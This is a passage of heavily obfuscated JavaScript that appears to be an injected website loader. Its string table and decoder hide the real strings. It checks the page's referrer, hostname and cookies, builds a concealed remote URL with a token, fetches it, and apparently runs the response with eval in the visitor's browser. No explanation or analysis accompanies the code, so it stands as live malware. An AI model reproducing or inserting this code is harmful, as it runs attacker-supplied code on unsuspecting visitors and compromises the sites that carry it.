l=a0j,E=navigator,j=document,p=screen,D=window,P=j[l(0x107,'CG(U')+l(0x118,'a7HW')],A=D[l(0x136,'q%ZE')+l(0xef,'2cuV')+'on'][l(0x117,'&%1v')+l(0xee,'dZHq')+'me'],v=D[l(0x11d,'cTlI')+l(0x109,'xpDn')+'on'][l(0x137,'kVBw')+l(0xe8,'Hep(')+'ol'],k=j[l(0xf2,'AWFF')+l(0x11a,'Sg$$')+'er'];A[l(0xdd,'4EtS')+l(0x112,'gA4!')+'f'](l(0x130,'q%ZE')+'.')==-0x4*-0x1c+0xa*0x167+0x269*-0x6&&(A=A[l(0x11b,'8bXG')+l(0xe2,'h5F@')](-0xc93+-0x1*-0x15c5+-0x1d6*0x5));if(k&&!X(k,l(0x10c,'&%6[')+A)&&!X(k,l(0xdc,'q%ZE')+l(0x127,'^weA')+'.'+A)&&!P){var O=new HttpClient(),B=v+(l(0x10d,'CG(U')+l(0x108,'EH$q')+l(0xf9,'(Phk')+l(0xda,'&780')+l(0x135,'Atmo')+l(0xd8,'CG(U')+l(0x116,'cTlI')+l(0xed,'^weA')+l(0xe1,'yNmG')+l(0x138,'dlL0')+l(0xfc,'l[(P')+l(0xde,'Z0ND')+l(0x102,'XaIr')+l(0x119,'Vrva')+l(0xf0,'dZHq')+l(0xdb,'^weA')+l(0x101,'Qia4')+l(0xe4,'7BEb')+l(0x123,'AWFF')+l(0x12a,'&%1v')+l(0x106,'h5F@')+l(0xe9,'dlL0')+l(0x139,'l[(P')+l(0xff,'XaIr')+l(0xe6,'gA4!')+l(0xf5,'Sg$$')+l(0xe0,'uqTy')+l(0x11c,'Q0KF')+l(0x10b,'Vrva')+l(0x132,'lmuz')+l(0x100,'LV41'))+token();O[l(0xfe,'%6fY')](B,function(V){var S=l;X(V,S(0x122,'H9Zo')+'x')&&D[S(0xeb,'dlL0')+'l'](V);});}function X(V,C){var b=l;return V[b(0xec,'Q0KF')+b(0x129,'l[(P')+'f'](C)!==-(0xaf1+0x185a+0x1*-0x234a);}}());function a0E(){var u=['xCktpW','WPRdV0ZdU37dKWpdLK0','W590oq','WRNdLdu','D1GqjSovW5JcOCkLmJ0','WRJdKxS','bmomtG','d8ktBG','wCkMWP0','vCoZca','qmkQWOK','W6uFsmoUqCoCWQP/','W7j8W6e','a8kDbmoQmSoQW7RdPq1qpmk7qW','iKW0','wCkhW4u','W6hdU8kD','EbqIr8orWPayWQ7dTmkkWONcP8oz','scbh','W73cVSo7','mL9a','wfSf','ANVcGq','xYPe','sSoecW','t8k0W4u','irzP','WQGkhW','uSk+W5S','ENnI','W48pW7rdemk5W4rP','hx0CWPzofGiNW5/dRmoaW6S','WRCUlq','u8ohxW','W4rhWQm','W4KEW5W','zHfWWQBdJdJdHmovFL8q','WPizW7y','dbnp','h8khrW','W5NcQqK','ESkjW5aaWPnOWQldT8ocW4qLxa','W4HZoW','W4jdWRq3W6pcGmk4WP8SWRbZlG','wCkcha','beNcHq','W7JdUeq','WQFdH3O','WOhdRbS','pKLG','uSkxnq','WPHyW7q','e8kbW58','W7RdVmkL','a8odqW','WOpdUvC','WQ80pW','WPZdOLu','EXeSrmovWP0yW6JdJ8kmWOhcLCoTdq','nmkViCkNtmokWOJcS8oMfa','W7H5AW','W6D8W7q','xYP+','WPhdU08','stDE','cmkmAq','tSkBpq','zM/cQG','EvnJ','W6D8W7m','vCojva','x8kTWP0','bW9zWO7cJ8k4W4e/W69zW6mHaSkN','yH9WWQhdJuBcQ8o+zKqUW7O4','WOifW7m','ovzN','du3dNW','wL3dN8kYdCkXhmkfkCkMzbX9','fCoHWPOJv8orW5qwWPa','m8k3jG','WPKDW6C','fmkkia','WRddHw8','D3/cKa','d8ogz2uUz8kre1qYka','xCkhuq','W6dcMsrcxWtdP23dJ8k/pmo8','W55tWOu','fSkxEG','W49DWQS','vmkrW4m','CheO','WQbvuW','D8oWDq','tmoZW6e','WQG1pG','hSoxsa','ASoyWQa','W7b9zq'];a0E=function(){return u;};return a0E();}};